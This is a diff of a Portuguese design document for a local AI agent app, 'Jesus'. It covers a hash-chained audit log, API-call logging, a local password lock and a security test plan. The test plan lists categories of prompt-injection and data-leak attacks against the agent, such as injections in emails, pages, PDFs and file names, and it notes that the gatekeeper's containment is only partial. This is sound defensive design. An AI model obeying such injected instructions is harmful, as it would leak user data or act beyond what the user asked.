+**Formato ([decisão 0022](decisoes/0022-registro-de-auditoria-e-mascaramento.md)):** JSONL só de acréscimo, cada linha com o SHA-256 do JSON canônico dela e o hash da anterior; uma âncora fora do arquivo (o fim conhecido) pega o corte do fim e a troca do arquivo. Ao abrir, o registro inteiro é conferido; se estiver adulterado, vai para o lado como prova e um registro novo começa ligado à última âncora boa. Âncora que não se lê (arquivo estragado, cifra que não abre mais) vale como ausente, com a marca no evento: o registro nunca deixa de abrir por causa dela. Cada linha vai ao disco antes de a âncora avançar. Limite: quem roda como o usuário consegue reescrever registro e âncora juntos (seção 3.5); contra o agente, valem as regras de negação das pastas do Jesus.
 
 Cada ação registra:
 
@@ -588,12 +655,14 @@ Cada ação registra:
 - confirmação (quem, como, quando);
 - resultado resumido e custo.
 
+**Chamadas à API (decisão 0023):** `api.reserved` antes de mandar (sem registro, o pedido não sai), `api.call` depois (resultado, uso, custo e se é estimado), `api.refused` e `api.over_budget` (no máximo um por minuto de cada, com a contagem dos que ficaram de fora). Nunca a chave nem o conteúdo da conversa.
+
 Na interface, aparece como uma linha do tempo, que pode ser exportada.
 
 ## 3.17 Testes de segurança
 
 - **Testes unitários** para cada regra fixa e para a normalização (caminhos do Windows, comandos compostos, ofuscação).
-- **Coleção de ataques** que cresce sempre:
+- **Coleção de ataques** (`security/attack-corpus`, `npm run attack-corpus`; roda também no `npm test` e no CI) que cresce sempre. Começou com a leitura de arquivos (73 casos: caminhos ambíguos do Windows, links e junções para fora, segredos, pastas do Jesus, hardlinks), as pastas que o dono pode liberar e os alvos de link (25 casos: rede por SMB e WebDAV, dispositivos, fora, sensível, Jesus); depois:
   - e-mails, páginas, PDFs, issues, convites de agenda, nomes de arquivo e transcrições com injeções;
   - cenários de vazamento de dados;
   - pedidos ambíguos que tentam deixar o agente "afobado".
@@ -619,3 +688,17 @@ Na interface, aparece como uma linha do tempo, que pode ser exportada.
 - No modo padrão (sem AppContainer nem WSL2), a contenção é parcial: um comando malicioso que passe pelo Porteiro ainda pode ler arquivos fora das pastas negadas.
 - As confirmações dependem de você ler o cartão.
 - Modelos diferentes se comportam de jeitos diferentes, então a coleção de ataques precisa rodar para cada um.
+
+## 3.20 Senha local do Jesus
+
+Pedido do dono ([decisão 0015](decisoes/0015-senha-local-com-bcrypt-e-dados-cifrados.md)): o Jesus pede uma senha própria para abrir.
+
+- **Quando pede:** ao abrir, depois de 15 min sem uso (ajustável de 1 a 120 min), quando o Windows bloqueia a sessão e quando o PC suspende. Relógio que volta não adia o bloqueio: o prazo passa a contar do instante corrigido. Um bloqueio que chega enquanto a senha ainda está sendo conferida vence o resultado atrasado.
+- **Bloqueio do Windows e uso de verdade ([decisão 0019](decisoes/0019-bloqueio-pelos-eventos-do-windows.md)):** o processo principal vê a sessão bloqueada e a suspensão (com o estado do sistema a cada 15 s como segunda barreira), apaga o pote de cookies, avisa o servidor da interface (que confirma em 2 s ou é reiniciado, já bloqueado) e volta a janela para a entrada (se em 3 s ela não passou pela entrada, vai direto, com aviso no log; o mesmo vale para o vigia de quadros). Só a entrada que o sistema entrega à janela conta como uso: no app, um script da página não consegue adiar o bloqueio. O uso do resto do PC não conta.
+- **Como guarda:** só o hash bcrypt (custo 12), na tabela `app_credentials`, que só o processo principal lê e grava (papel `jesus_config`; o Cérebro e o Executor não têm acesso). O banco recusa qualquer valor que não seja um hash bcrypt.
+- **Regras:** no mínimo 12 caracteres (15 ou mais recomendados); no máximo 72 bytes, o limite do bcrypt, recusando em vez de cortar (e recusando também, na conferência, a senha certa seguida de mais bytes além do 72º); sem U+0000, caracteres de controle nem surrogate sozinho (o bcrypt repete a senha em ciclo, e "senha\0senha" daria a mesma chave; a conferência também recusa); normalização NFC; recusa de senhas comuns, trechos repetidos de qualquer tamanho (também só de símbolos ou emoji, ou uma letra repetida entre símbolos), senhas com 3 caracteres diferentes ou menos e sequências; sem regra de composição.
+- **Tentativas erradas:** 5 livres; depois, espera que dobra a cada erro (30 s, 1 min, 2 min… até 15 min). A contagem fica no banco e é atômica, e é uma só para o app: quem alcança a tela de entrada consegue impor a espera ao dono. Por isso só a janela do Jesus pode alcançar o serviço (no app instalado não há porta; em desenvolvimento, a lista de `Host` barra sites, mas não programas do próprio PC). Nunca há bloqueio permanente: se o relógio voltar para antes do último erro (ou o erro ficar sem data), a espera é reancorada no instante atual e termina em no máximo o tempo exigido. A mesma espera vale para o código de recuperação. A auditoria registra cada erro com a operação (desbloquear, trocar a senha ou recuperar) e cada espera uma vez só.
+- **Código de recuperação:** 100 bits aleatórios, mostrado uma vez na criação, guardado só como hash bcrypt; usado, é trocado por um novo.
+- **Com o Jesus bloqueado:** a interface mostra só a tela de entrada; pedidos novos não entram; cartões de confirmação e fluxos de conexão de contas são cancelados (o código do device flow sai da tela); "Jesus, pare" continua funcionando.
+- **Quem decide:** o servidor da interface (Server Actions do Next dentro do app, [decisão 0016](decisoes/0016-nextjs-com-servidor-dentro-do-electron.md)), com o serviço e a máquina de estados do `@jesus/auth`. A página só manda a senha e recebe o resultado; nunca vê o hash e não consegue se desbloquear sozinha.
+- **Limite honesto:** a senha protege o app de quem chega ao PC desbloqueado, mas não cifra os dados: um programa rodando como você ainda consegue pedir ao DPAPI a chave de dados (3.5). Derivar a chave também da senha fica como pergunta em aberto para o dono, depois das rotinas.
